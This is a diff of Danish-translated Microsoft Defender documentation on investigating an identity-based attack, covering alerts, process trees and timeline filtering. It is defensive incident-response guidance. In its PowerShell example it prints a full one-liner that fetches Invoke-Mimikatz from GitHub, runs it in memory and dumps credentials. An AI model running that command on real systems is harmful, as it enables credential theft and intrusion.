@@ -1,7 +1,7 @@
 ---
 title: Eksempel på et identitetsbaseret angreb
-description: Gennemgå en eksempelanalyse af et identitetsbaseret angreb.
-keywords: hændelser, beskeder, undersøge, korrelation, angreb, maskiner, enheder, brugere, identiteter, identitet, postkasse, mail, 365, microsoft, m365, hændelsesrespons, cyberangreb
+description: Gennemgå et eksempel på en analyse af et identitetsbaseret angreb.
+keywords: hændelser, beskeder, undersøge, korrelation, angreb, maskiner, enheder, brugere, identitet, identitet, postkasse, mail, 365, microsoft, m365, svar på hændelser, cyberangreb
 search.product: eADQiWindows 10XVcnh
 ms.prod: m365-security
 ms.mktglfcycl: deploy
@@ -16,18 +16,18 @@ manager: dansimp
 audience: ITPro
 ms.collection:
 - M365-security-compliance
-- m365initiative-m365-defender
+- m365solution-firstincident
 ms.topic: conceptual
 search.appverid:
 - MOE150
 - MET150
 ms.technology: m365d
-ms.openlocfilehash: 6d62e1127eabb401a6af77aa1bbf073e4cfced17
-ms.sourcegitcommit: a4729532278de62f80f2160825d446f6ecd36995
+ms.openlocfilehash: 2e0b237ad045b98b2bb013399f344db3f20f1919
+ms.sourcegitcommit: c1eaea74c8ffce2f9f477c9469342e88e4a70c14
 ms.translationtype: MT
 ms.contentlocale: da-DK
-ms.lasthandoff: 03/31/2022
-ms.locfileid: "64570101"
+ms.lasthandoff: 07/20/2022
+ms.locfileid: "66893611"
 ---
 # <a name="example-of-an-identity-based-attack"></a>Eksempel på et identitetsbaseret angreb
 
@@ -36,60 +36,60 @@ ms.locfileid: "64570101"
 **Gælder for:**
 - Microsoft 365 Defender
 
-Microsoft Defender for Identity kan hjælpe med at registrere ondsindede forsøg på at kompromittere identiteter i organisationen. Da Defender for Identity er integreret med Microsoft 365 Defender, kan sikkerhedsanalytikere få indsigt i trusler, der kommer fra Defender for Identity, f.eks. mistænkelige forsøg på at øge tilladelser for Netlogon.
+Microsoft Defender for Identity kan hjælpe med at registrere skadelige forsøg på at kompromittere identiteter i din organisation. Da Defender for Identity kan integreres med Microsoft 365 Defender, kan sikkerhedsanalytikere have synlighed ved trusler, der kommer ind fra Defender for Identity, f.eks. mistænkte forsøg på udvidede Netlogon-rettigheder.
 
-## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analyse af angrebene i Microsoft Defender for Identity
+## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analyse af angrebet i Microsoft Defender for Identity
 
-Microsoft 365 Defender gør det muligt for analytikere at filtrere beskeder ved at registrere **kilden** på fanen Beskeder på siden Hændelser. I følgende eksempel filtreres registreringskilden til **Defender for Identity**. 
+Microsoft 365 Defender gør det muligt for analytikere at filtrere beskeder efter registreringskilde under fanen **Beskeder** på hændelsessiden. I følgende eksempel filtreres registreringskilden til **Defender for Identity**. 
 
 :::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Filtrering af registreringskilden i Microsoft Defender for Identity" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::
 
-Hvis du vælger **beskeden om et mistænkeligt overførings-hash-angreb**, går det til en side Microsoft Defender for Cloud Apps der viser mere detaljerede oplysninger. Du kan altid få mere at vide om en besked eller et angreb ved at vælge Få mere at vide om denne **beskedtype** for at læse en beskrivelse af angrebene [og](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) løsningsforslag.
+Hvis du vælger den **mistænkte overpass-the-hash angreb** besked går til en side i Microsoft Defender for Cloud Apps, der viser mere detaljerede oplysninger. Du kan altid få mere at vide om en besked eller et angreb ved at vælge **Få mere at vide om denne beskedtype** for at læse en [beskrivelse af angrebs](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) - og afhjælpningsforslag.
  
-:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="En mistænkelig overadgangsadvarsel om hash-angreb" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 
+:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="En formodet overpass-the-hash angreb besked" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 
 
-## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Undersøger det samme angreb i Microsoft Defender for Endpoint
+## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Undersøgelse af det samme angreb i Microsoft Defender for Endpoint
 
-Alternativt kan en analytiker bruge Defender til Slutpunkt til at få mere at vide om aktiviteten på et slutpunkt. Vælg hændelsen fra hændelseskøen, og vælg **derefter fanen Vigtige** beskeder. Herfra kan de også identificere registreringskilden. En registreringskilde, der er mærket Slutpunktsregistrering og -svar, står for Slutpunktsregistrering og -svar, som er Defender til slutpunkt. Herfra vælger analytikeren en besked, der er registreret af Slutpunktsregistrering og -svar.
+En analytiker kan også bruge Defender for Endpoint til at få mere at vide om aktiviteten på et slutpunkt. Vælg hændelsen fra hændelseskøen, og vælg derefter fanen **Beskeder** . Herfra kan de også identificere registreringskilden. En registreringskilde, der er mærket som EDR, står for Endpoint Detection and Response, som er Defender for Endpoint. Herfra vælger analytikeren en besked, der er registreret af EDR.
 
-:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Registrering af slutpunkt og svar i Microsoft Defender for Endpoint-portalen" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::
+:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Registrering og svar af slutpunkter på portalen Microsoft Defender for Endpoint" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::
 
-Siden med beskeder viser forskellige relevante oplysninger, som f.eks. den på påvirkede enheds navn, brugernavn, status for automatisk undersøgelse og oplysningerne om beskeden. Beskedens historie viser en visuel repræsentation af procestræet. Procestræet er en hierarkisk hierarkisk repræsentation af overordnede og underordnede processer, der er relateret til beskeden.
+På beskedsiden vises forskellige relevante oplysninger, f.eks. det påvirkede enhedsnavn, brugernavnet, status for den automatiske undersøgelse og oplysningerne om beskeden. Beskedhistorien viser en visuel repræsentation af procestræet. Procestræet er en hierarkisk repræsentation af overordnede og underordnede processer, der er relateret til beskeden.
 
-:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Et advarselsprocestræ i Microsoft Defender for Endpoint" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 
+:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Et beskedprocestræ i Microsoft Defender for Endpoint" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 
 
-Hver proces kan udvides for at få vist flere detaljer. Detaljer, som en analytiker kan se, er de faktiske kommandoer, der blev indtastet som en del af et skadeligt script, IP-adresser til udgående forbindelse og andre nyttige oplysninger.
+Hver proces kan udvides for at få vist flere detaljer. Detaljer, som en analytiker kan se, er de faktiske kommandoer, der blev angivet som en del af et skadeligt script, IP-adresser til udgående forbindelser og andre nyttige oplysninger.
 
-:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Oplysninger om processen i Microsoft Defender for Endpoint portal" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
+:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Procesdetaljerne på Microsoft Defender for Endpoint-portalen" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
  
-Ved at vælge **Se på tidslinjen** kan en analytiker analysere yderligere for at fastlægge det nøjagtige tidspunkt for kompromiset. 
+Ved at vælge **Se på tidslinjen** kan en analytiker foretage detailudledning yderligere for at bestemme det nøjagtige tidspunkt for kompromiset. 
 
-Microsoft Defender for Endpoint kan registrere mange skadelige filer og scripts. På grund af mange legitime anvendelser til udgående forbindelser, PowerShell og kommandolinjeaktivitet betragtes visse aktiviteter som gode, indtil der oprettes en skadelig fil eller aktivitet. Brug af tidslinjen hjælper derfor analytikere med at sætte beskeden ind i konteksten med den omgivende aktivitet for at bestemme den oprindelige kilde eller klokkeslæt for de angreb, der ellers er skjult af almindeligt filsystem og brugeraktivitet. 
+Microsoft Defender for Endpoint kan registrere mange skadelige filer og scripts. På grund af mange legitime anvendelser af udgående forbindelser, PowerShell og kommandolinjeaktivitet vil nogle aktiviteter dog blive betragtet som godartede, indtil der oprettes en skadelig fil eller aktivitet. Brug af tidslinjen hjælper derfor analytikere med at sætte beskeden i kontekst med den omgivende aktivitet for at bestemme den oprindelige kilde eller tidspunktet for det angreb, der ellers er tilsløret af almindeligt filsystem og brugeraktivitet. 
 
-Hvis du vil bruge tidslinjen, starter en analytiker på tidspunktet for registrering af påmindelser (med rødt) og ruller bagud i tid for at afgøre, hvornår den oprindelige aktivitet, der førte til den ondsindede aktivitet, faktisk startede. 
+Hvis du vil bruge tidslinjen, vil en analytiker starte på tidspunktet for registrering af beskeder (med rødt) og rulle bagud i tiden for at bestemme, hvornår den oprindelige aktivitet, der førte til den skadelige aktivitet, faktisk startede. 
 
-:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Analytikerens starttid for registrering af beskeder" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 
+:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Analytikerens starttidspunkt for registrering af beskeder" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 
 
-Det er vigtigt at forstå og skelne almindelige aktiviteter som f.eks. Windows Update-forbindelser, Windows trafik til aktivering af software, der er tillid til, andre almindelige forbindelser til Microsoft-websteder, internetaktivitet fra tredjeparter, Microsoft Endpoint Configuration Manager-aktivitet og anden tilbedre aktivitet fra mistænkelig aktivitet. En måde at skelne på er ved at bruge tidslinjefiltre. Der er mange filtre, der kan fremhæve bestemt aktivitet, mens der filtreres fra alt, hvad analytikeren ikke vil have vist. 
+Det er vigtigt at forstå og skelne mellem almindelige aktiviteter, f.eks. Windows Update forbindelser, windows-aktiveringstrafik, andre almindelige forbindelser til Microsoft-websteder, internetaktivitet fra tredjepart, Microsoft Endpoint Configuration Manager aktivitet og andre godartede aktiviteter fra mistænkelig aktivitet. En måde at skelne på er ved hjælp af tidslinjefiltre. Der er mange filtre, der kan fremhæve bestemte aktiviteter, mens du filtrerer alt, hvad analytikeren ikke vil have vist. 
 
-På billedet nedenfor filtrerede analytikeren for kun at få vist netværks- og proceshændelser. Dette filterkriterie giver analytikeren mulighed for at se de netværksforbindelser og processer, der omgiver begivenheden, hvor Notesblok oprettede en forbindelse til en IP-adresse, hvilket vi også så i procestræet. 
+På billedet nedenfor filtrerede analytikeren kun for at få vist netværks- og proceshændelser. Dette filterkriterium giver analytikeren mulighed for at se netværksforbindelserne og processerne omkring hændelsen, hvor Notesblok oprettede en forbindelse med en IP-adresse, som vi også så i procestræet. 
 
-:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Hvordan Notesblok bruges til at oprette en ondsindet udgående forbindelse" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 
+:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Sådan blev Notesblok brugt til at oprette en skadelig udgående forbindelse" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 
 
-I denne bestemte hændelse blev Notesblok brugt til at oprette en skadelig udgående forbindelse. Dog vil hackere ofte bruge iexplorer.exe til at etablere forbindelser til at downloade en ondsindet nyttedata, fordi iexplorer.exe processer betragtes som almindelig aktivitet i webbrowseren.
+I denne særlige hændelse blev Notesblok brugt til at oprette en skadelig udgående forbindelse. Men ofte vil hackere bruge iexplorer.exe til at oprette forbindelser til at downloade skadelige nyttedata, fordi normalt iexplorer.exe processer betragtes som almindelig webbrowseraktivitet.
 
-Et andet element, der skal søges efter på tidslinjen, er PowerShell bruger til udgående forbindelser. Analytikeren leder efter vellykkede PowerShell-forbindelser `IEX (New-Object Net.Webclient)` med kommandoer som f.eks. efterfulgt af en udgående forbindelse til et websted, der er vært for en skadelig fil. 
+Et andet element, du kan søge efter på tidslinjen, er PowerShell bruger til udgående forbindelser. Analytikeren vil søge efter vellykkede PowerShell-forbindelser med kommandoer, f.eks `IEX (New-Object Net.Webclient)` . efterfulgt af en udgående forbindelse til et websted, der er vært for en skadelig fil. 
 
 I følgende eksempel blev PowerShell brugt til at downloade og udføre Mimikatz fra et websted:
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
 ```
-En analytiker kan hurtigt søge efter nøgleord ved at skrive nøgleordet i søgefeltet for kun at få vist begivenheder, der er oprettet med PowerShell. 
+En analytiker kan hurtigt søge efter nøgleord ved at skrive nøgleordet i søgelinjen for kun at få vist de hændelser, der er oprettet med PowerShell. 
 
 ## <a name="next-step"></a>Næste trin
 
-Se stien [til phishingundersøgelse](first-incident-path-phishing.md) .
+Se [phishing-undersøgelsesstien](first-incident-path-phishing.md) .
 
 ## <a name="see-also"></a>Se også
 
